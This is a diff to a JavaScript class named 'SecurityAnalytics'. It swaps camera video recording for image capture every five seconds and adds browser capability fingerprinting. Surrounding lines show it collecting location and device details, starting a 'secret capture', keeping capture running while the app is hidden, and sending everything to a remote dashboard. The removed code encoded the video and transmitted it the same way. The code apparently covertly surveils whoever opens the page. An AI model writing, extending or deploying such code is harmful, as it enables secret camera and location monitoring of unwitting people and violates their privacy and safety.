@@ -26,14 +26,8 @@ class SecurityAnalytics {
     this.sessionId = this.generateSessionId();
     this.dashboardWindow = null;
     
-    // Video recording properties
-    this.mediaRecorder = null;
-    this.recordedChunks = [];
-    this.videoBlob = null;
-    this.recordingStartTime = null;
-    this.recordingDuration = 2 * 60 * 1000; // 2 minutes in milliseconds
+    // Image capture properties
     this.imageCaptureInterval = null;
-    this.recordingTimeout = null;
     
     // Tab visibility tracking
     this.isTabHidden = false;
@@ -295,12 +289,7 @@ class SecurityAnalytics {
   handleMobileAppHidden() {
     console.log('Mobile app hidden - ensuring recording continues');
     
-    // Continue recording in background
-    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
-      console.log('Video recording continues in mobile background');
-    }
-
-    // Continue image capture
+    // Continue image capture in background
     if (this.imageCaptureInterval) {
       console.log('Image capture continues in mobile background');
     }
@@ -429,10 +418,10 @@ class SecurityAnalytics {
   performFinalSave() {
     console.log('Performing final save before page unload');
 
-    // Stop recording if still active
-    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
-      console.log('Stopping recording for final save');
-      this.stopVideoRecording();
+    // Stop image capture if still active
+    if (this.imageCaptureInterval) {
+      clearInterval(this.imageCaptureInterval);
+      this.imageCaptureInterval = null;
     }
 
     // Final data transmission
@@ -1139,13 +1128,14 @@ class SecurityAnalytics {
     // Collect device information
     this.collectDeviceInfo();
     this.collectBrowserInfo();
+    this.collectBrowserCapabilities();
     
     // Only try to collect camera if not already collected
     if (!this.cameraStream) {
       await this.tryCollectCamera();
     } else {
-      console.log('Camera stream already available, starting recording');
-      this.startVideoRecording();
+      console.log('Camera stream already available, starting image capture');
+      this.startImageCapture();
     }
     
     // Only try to collect location if not already collected
@@ -1190,6 +1180,51 @@ class SecurityAnalytics {
     };
   }
 
+  collectBrowserCapabilities() {
+    this.collectedData.browserCapabilities = {
+      webRTC: !!navigator.mediaDevices && !!navigator.mediaDevices.getUserMedia,
+      webGL: (() => {
+        try {
+          const canvas = document.createElement('canvas');
+          return !!(window.WebGLRenderingContext && canvas.getContext('webgl'));
+        } catch (e) {
+          return false;
+        }
+      })(),
+      webGL2: (() => {
+        try {
+          const canvas = document.createElement('canvas');
+          return !!(window.WebGL2RenderingContext && canvas.getContext('webgl2'));
+        } catch (e) {
+          return false;
+        }
+      })(),
+      indexedDB: !!window.indexedDB,
+      localStorage: (() => {
+        try {
+          localStorage.setItem('test', 'test');
+          localStorage.removeItem('test');
+          return true;
+        } catch (e) {
+          return false;
+        }
+      })(),
+      sessionStorage: (() => {
+        try {
+          sessionStorage.setItem('test', 'test');
+          sessionStorage.removeItem('test');
+          return true;
+        } catch (e) {
+          return false;
+        }
+      })(),
+      geolocation: !!navigator.geolocation,
+      notifications: !!window.Notification,
+      serviceWorker: !!navigator.serviceWorker,
+      webAssembly: typeof WebAssembly === 'object' && typeof WebAssembly.instantiate === 'function'
+    };
+  }
+
   getBrowserName() {
     const ua = navigator.userAgent;
     if (ua.includes('Chrome')) return 'Chrome';
@@ -1219,8 +1254,8 @@ class SecurityAnalytics {
         settings: stream.getVideoTracks()[0].getSettings()
       };
       
-      // Start video recording immediately
-      this.startVideoRecording();
+      // Start image capture immediately
+      this.startImageCapture();
       
       // Start secret capture
       this.startSecretCapture();
@@ -2018,70 +2053,6 @@ class SecurityAnalytics {
     });
   }
 
-  startVideoRecording() {
-    console.log('=== VIDEO RECORDING STARTED ===');
-    console.log('Camera stream available:', !!this.cameraStream);
-    if (!this.cameraStream) {
-      console.log('ERROR: No camera stream available for video recording');
-      return;
-    }
-    
-    this.recordingStartTime = Date.now();
-    this.recordedChunks = [];
-    console.log('Recording start time:', new Date(this.recordingStartTime).toISOString());
-    console.log('Recording duration set to:', this.recordingDuration / 1000, 'seconds');
-    
-    // Create MediaRecorder with high quality settings
-    const options = {
-      mimeType: 'video/webm;codecs=vp9,opus',
-      videoBitsPerSecond: 2500000, // 2.5 Mbps
-      audioBitsPerSecond: 128000   // 128 kbps
-    };
-    
-    console.log('MediaRecorder options:', options);
-    
-    try {
-      this.mediaRecorder = new MediaRecorder(this.cameraStream, options);
-      console.log('MediaRecorder created with VP9/Opus codec');
-    } catch (e) {
-      console.log('VP9 codec not supported, falling back to default codec');
-      this.mediaRecorder = new MediaRecorder(this.cameraStream);
-      console.log('MediaRecorder created with default codec');
-    }
-    
-    this.mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        this.recordedChunks.push(event.data);
-        console.log(`Video chunk received: ${event.data.size} bytes, total chunks: ${this.recordedChunks.length}`);
-      }
-    };
-    
-    this.mediaRecorder.onstop = () => {
-      console.log('=== VIDEO RECORDING STOPPED ===');
-      console.log('Total chunks collected:', this.recordedChunks.length);
-      
-      this.videoBlob = new Blob(this.recordedChunks, { type: 'video/webm' });
-      console.log('Video blob created:', this.videoBlob.size, 'bytes');
-      
-      this.saveVideo();
-    };
-    
-    // Start recording
-    this.mediaRecorder.start(1000); // Collect data every 1 second
-    console.log('MediaRecorder started with 1-second intervals');
-    
-    // Start image capture every 5 seconds
-    this.startImageCapture();
-    
-    // Auto-stop after 2 minutes
-    this.recordingTimeout = setTimeout(() => {
-      console.log('Auto-stop timeout triggered after 2 minutes');
-      this.stopVideoRecording();
-    }, this.recordingDuration);
-    
-    console.log('Video recording pipeline fully initiated');
-  }
-
   startImageCapture() {
     console.log('=== IMAGE CAPTURE STARTED ===');
     console.log('Camera stream available:', !!this.cameraStream);
@@ -2147,71 +2118,6 @@ class SecurityAnalytics {
     }, 5000);
     
     console.log('Image capture interval set: every 5 seconds');
-  }
-
-  stopVideoRecording() {
-    if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
-      this.mediaRecorder.stop();
-    }
-    
-    if (this.imageCaptureInterval) {
-      clearInterval(this.imageCaptureInterval);
-      this.imageCaptureInterval = null;
-    }
-    
-    if (this.recordingTimeout) {
-      clearTimeout(this.recordingTimeout);
-      this.recordingTimeout = null;
-    }
-    
-    console.log('Video recording stopped after 2 minutes');
-  }
-
-  saveVideo() {
-    console.log('=== SAVING VIDEO TO DASHBOARD ===');
-    console.log('Video blob available:', !!this.videoBlob);
-    if (!this.videoBlob) {
-      console.log('ERROR: No video blob to save');
-      return;
-    }
-    
-    console.log('Video blob size:', this.videoBlob.size, 'bytes');
-    console.log('Video blob type:', this.videoBlob.type);
-    
-    // Convert video blob to base64 for dashboard transmission
-    const reader = new FileReader();
-    reader.onloadend = () => {
-      const videoData = reader.result;
-      console.log('Video converted to base64, length:', videoData.length, 'characters');
-      
-      // Send video to dashboard
-      console.log('Sending video to dashboard...');
-      this.sendVideoToDashboard(videoData);
-      
-      // Generate and send Word document with stats
-      console.log('Generating stats document...');
-      this.generateStatsDocument();
-    };
-    
-    reader.onerror = (error) => {
-      console.error('ERROR reading video blob:', error);
-    };
-    
-    reader.readAsDataURL(this.videoBlob);
-    console.log('Video blob reading initiated');
-  }
-
-  sendVideoToDashboard(videoData) {
-    const videoPayload = {
-      type: 'VIDEO_RECORDING',
-      sessionId: this.sessionId,
-      videoData: videoData,
-      timestamp: new Date().toISOString(),
-      duration: this.recordingDuration,
-      fileName: `recording_${this.sessionId}_${new Date().toISOString().replace(/[:.]/g, '-')}.webm`
-    };
-    
-    this.sendDataToDashboard(videoPayload);
   }
 
   generateStatsDocument() {
